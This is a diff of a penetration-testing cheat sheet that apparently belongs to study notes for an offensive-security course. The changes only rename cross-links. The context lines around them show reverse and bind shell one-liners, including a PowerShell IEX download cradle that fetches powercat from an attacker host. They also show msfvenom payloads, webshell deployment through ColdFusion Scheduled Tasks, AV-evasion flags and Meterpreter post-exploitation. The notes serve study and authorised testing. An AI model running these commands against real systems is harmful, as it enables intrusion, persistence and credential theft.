@@ -30,7 +30,7 @@ sed -i "s/\$port = 1234;/\$port = 4444;/" php-reverse-shell.php
 ```
 *The CFM shell above needs a way onto the target's own web root to be reachable. On ColdFusion Admin specifically, its Scheduled Tasks feature will fetch a URL and save the response to a file you choose, an easy way to drop the shell without any file-upload vector at all: point a new scheduled task's URL at your hosted `shell.cfm`, set "Save output to file" to a path under the app's own `wwwroot`, then run it once.*
 
-See [[Common Web Application Attacks#9.2.3. Remote File Inclusion (RFI)|9.2.3]], [[Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1]], [[Common Web Application Attacks#9.4.1. OS Command Injection|9.4.1 (case study 4)]], [[Arctic|Arctic box writeup]] (the CFM shell, delivered via ColdFusion's Scheduled Tasks).
+See [[09. Common Web Application Attacks#9.2.3. Remote File Inclusion (RFI)|9.2.3]], [[09. Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1]], [[09. Common Web Application Attacks#9.4.1. OS Command Injection|9.4.1 (case study 4)]], [[Arctic|Arctic box writeup]] (the CFM shell, delivered via ColdFusion's Scheduled Tasks).
 
 #### Tags: #Webshells #PHPWebshell #ASPNETWebshell #CFMWebshell #ScheduledTask
 
@@ -57,7 +57,7 @@ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powe
 python3 -m http.server 80
 # Inject (URL-encoded): IEX (New-Object System.Net.Webclient).DownloadString("http://<your_ip>/powercat.ps1");powercat -c <your_ip> -p 4444 -e powershell
 ```
-See [[Common Web Application Attacks#9.2.1. Local File Inclusion (LFI)|9.2.1]] (bash), [[Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1]] (PowerShell base64), [[Common Web Application Attacks#9.4.1. OS Command Injection|9.4.1]] (Powercat), [[Client-Side Attacks#12.2.3. Leveraging Microsoft Word Macros|12.2.3]] (delivered via a VBA macro, chunked into ≤255-char string literals), [[Client-Side Attacks#Step 4: Build the `.lnk` shortcut payload (the actual reverse-shell trigger)|12.3.1]] (delivered via a `.lnk` shortcut's target field).
+See [[09. Common Web Application Attacks#9.2.1. Local File Inclusion (LFI)|9.2.1]] (bash), [[09. Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1]] (PowerShell base64), [[09. Common Web Application Attacks#9.4.1. OS Command Injection|9.4.1]] (Powercat), [[12. Client-Side Attacks#12.2.3. Leveraging Microsoft Word Macros|12.2.3]] (delivered via a VBA macro, chunked into ≤255-char string literals), [[12. Client-Side Attacks#Step 4: Build the `.lnk` shortcut payload (the actual reverse-shell trigger)|12.3.1]] (delivered via a `.lnk` shortcut's target field).
 
 > 🔗 Reverse shell one-liners for any language/encoding: revshells.com
 
@@ -86,7 +86,7 @@ cat <keyname>.pub > authorized_keys
 # a mechanically re-extracted copy before chasing OpenSSL-version theories
 ssh-keygen -p -m PEM -f <keyfile>
 ```
-See [[Common Web Application Attacks#9.1.2. Identifying and Exploiting Directory Traversals|9.1.2]] (the libcrypto troubleshooting saga), [[Common Web Application Attacks#9.3.2. Using Non-Executable Files|9.3.2]] (planting a key via upload+traversal).
+See [[09. Common Web Application Attacks#9.1.2. Identifying and Exploiting Directory Traversals|9.1.2]] (the libcrypto troubleshooting saga), [[09. Common Web Application Attacks#9.3.2. Using Non-Executable Files|9.3.2]] (planting a key via upload+traversal).
 
 #### Tags: #SSH #SSHKeyTheft #SSHKeyPlanting #LibcryptoTroubleshooting
 
@@ -139,7 +139,7 @@ For Meterpreter or staged payloads instead of a plain nc shell, replace the nc l
 
 Flag breakdown: `-NoP` skips the startup profile (removes logging hooks), `-NonI` suppresses interactive prompts, `-W Hidden` hides the terminal window, `-Exec Bypass` overrides execution policy for this session only. Full teardown: [[Antivirus Evasion (Breakdowns)#The PowerShell AV-bypass flags|Command Breakdowns]].
 
-See [[Antivirus Evasion#15.3.2. PowerShell In-Memory Injection|15.3.2]], [[Antivirus Evasion#Capstone 2: .bat Wrapper + COMODO|Capstone 2 (.bat variant)]].
+See [[15. Antivirus Evasion#15.3.2. PowerShell In-Memory Injection|15.3.2]], [[15. Antivirus Evasion#Capstone 2: .bat Wrapper + COMODO|Capstone 2 (.bat variant)]].
 
 #### Tags: #AntivirusEvasion #PowerShellInjection #IEX #DownloadCradle #InMemory
 
@@ -178,7 +178,7 @@ If the payload menu label says `[stager]`, use the Staged Payload Handler below 
 
 wine32 and prefix mechanics: [[Antivirus Evasion (Breakdowns)#Why Shellter needs wine32|Command Breakdowns]].
 
-See [[Antivirus Evasion#15.3.3. Shellter + Spotify Hands-On|15.3.3]], [[Antivirus Evasion#Capstone 1: Shellter + PuTTY + COMODO + FTP|Capstone 1]].
+See [[15. Antivirus Evasion#15.3.3. Shellter + Spotify Hands-On|15.3.3]], [[15. Antivirus Evasion#Capstone 1: Shellter + PuTTY + COMODO + FTP|Capstone 1]].
 
 #### Tags: #AntivirusEvasion #Shellter #PEInjection #Wine #Stealth
 
@@ -207,7 +207,7 @@ Slash (`windows/shell/reverse_tcp`) = staged, needs this handler. Underscore (`w
 
 Staged vs stageless mechanics: [[Antivirus Evasion (Breakdowns)#Staged vs stageless payloads|Command Breakdowns]].
 
-See [[Antivirus Evasion#15.3.3. Shellter + Spotify Hands-On|15.3.3]], [[Antivirus Evasion#Capstone 1: Shellter + PuTTY + COMODO + FTP|Capstone 1]].
+See [[15. Antivirus Evasion#15.3.3. Shellter + Spotify Hands-On|15.3.3]], [[15. Antivirus Evasion#Capstone 1: Shellter + PuTTY + COMODO + FTP|Capstone 1]].
 
 #### Tags: #AntivirusEvasion #MultiHandler #StagedPayload #Meterpreter #Msfconsole
 
@@ -236,7 +236,7 @@ Common gotchas:
 - `put /tmp/file.exe` alone gives `550 The system cannot find the path specified` because FTP uses the full local path `/tmp/file.exe` as the remote filename, which Windows rejects. Always `put <local> <remote>`.
 - Missing `binary` mode corrupts the binary -- the session will appear to succeed but the file won't execute
 
-See [[Antivirus Evasion#Capstone 1: Shellter + PuTTY + COMODO + FTP|Capstone 1]], [[Antivirus Evasion#Capstone 2: .bat Wrapper + COMODO|Capstone 2]].
+See [[15. Antivirus Evasion#Capstone 1: Shellter + PuTTY + COMODO + FTP|Capstone 1]], [[15. Antivirus Evasion#Capstone 2: .bat Wrapper + COMODO|Capstone 2]].
 
 #### Tags: #AntivirusEvasion #FTP #PayloadDelivery #ActiveMode
 
@@ -254,7 +254,7 @@ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l TARGET_IP PO
 nc -nv TARGET_IP PORT
 ```
 
-🔁 [[Shells & Payloads (HTB Supplementary)#SP.2. mkfifo Bind Shell|SP.2]]
+🔁 [[12. Client-Side Attacks#12.4.1. Shell Types: Interactive, Bind, and Reverse|SP.2]]
 
 #### Tags: #BindShell #mkfifo #netcat
 
@@ -273,7 +273,7 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('KALI_IP',
 
 Catch it with `nc -nvlp PORT` on Kali.
 
-🔁 [[Shells & Payloads (HTB Supplementary)#SP.3. PowerShell Reverse Shell + Disable Defender|SP.3]]
+🔁 [[12. Client-Side Attacks#12.4.1. Shell Types: Interactive, Bind, and Reverse|SP.3]]
 
 #### Tags: #PowerShell #TCPClient #ReverseShell #Windows
 
@@ -297,7 +297,7 @@ cp /usr/share/nishang/Antak-WebShell/antak.aspx .
 # Note: runs as iis apppool\<appname>, likely has SeImpersonatePrivilege
 ```
 
-🔁 [[Shells & Payloads (HTB Supplementary)#SP.7. Laudanum ASPX Webshell|SP.7]], [[Shells & Payloads (HTB Supplementary)#SP.8. Antak Webshell|SP.8]]
+🔁 [[09. Common Web Application Attacks#9.3.3. Advanced Upload Filter Bypasses|Laudanum and Antak webshell delivery]]
 
 #### Tags: #Laudanum #Antak #Webshell #ASPX #IIS #Nishang
 
@@ -319,7 +319,7 @@ nc -nvlp PORT
 
 If the target is behind a pivot/jump host, set `LHOST` to the internal IP of the jump host (not your Kali IP) and catch the shell on the pivot.
 
-🔁 [[Shells & Payloads (HTB Supplementary)#SP.10. Tomcat WAR Shell Delivery|SP.10]]
+🔁 [[09. Common Web Application Attacks#9.6. Attacking Common Applications|SP.10]]
 
 #### Tags: #Tomcat #WAR #msfvenom #JavaShell
 
@@ -373,7 +373,7 @@ set SESSION 1
 run
 ```
 
-Cross-link: [[The Metasploit Framework#21.1.1 Setup and Work with MSF|Module 21 §21.1.1]]
+Cross-link: [[21. The Metasploit Framework#21.1.1 Setup and Work with MSF|Module 21 §21.1.1]]
 
 #### Tags: #Metasploit #msfdb #dbNmap #SessionManagement #setg #background #Module21
 
@@ -424,7 +424,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.x LPORT=443 -f aspx -
 
 > Staged payloads (slash notation: `shell/reverse_tcp`) require `multi/handler` to send stage 2. Non-staged (underscore: `shell_reverse_tcp`) work with plain nc.
 
-Cross-link: [[The Metasploit Framework#21.2.3 Executable Payloads|Module 21 §21.2.3]]
+Cross-link: [[21. The Metasploit Framework#21.2.3 Executable Payloads|Module 21 §21.2.3]]
 
 #### Tags: #msfvenom #Metasploit #StagedPayloads #PayloadGeneration #Module21
 
@@ -484,7 +484,7 @@ portfwd list
 run post/windows/gather/enum_hostfile
 ```
 
-Cross-link: [[The Metasploit Framework#21.3 Performing Post-Exploitation with Metasploit|Module 21 §21.3]]
+Cross-link: [[21. The Metasploit Framework#21.3 Performing Post-Exploitation with Metasploit|Module 21 §21.3]]
 
 #### Tags: #Meterpreter #PostExploitation #getsystem #Kiwi #Mimikatz #portfwd #Module21
 
@@ -517,6 +517,6 @@ ls /usr/share/metasploit-framework/scripts/resource/
 
 > `AutoRunScript` and `ExitOnSession` are **advanced options**, not visible in `show options`. Use `show advanced` to see them.
 
-Cross-link: [[The Metasploit Framework#21.4.1 Resource Scripts|Module 21 §21.4.1]]
+Cross-link: [[21. The Metasploit Framework#21.4.1 Resource Scripts|Module 21 §21.4.1]]
 
 #### Tags: #ResourceScripts #Metasploit #AutoRunScript #ExitOnSession #Module21
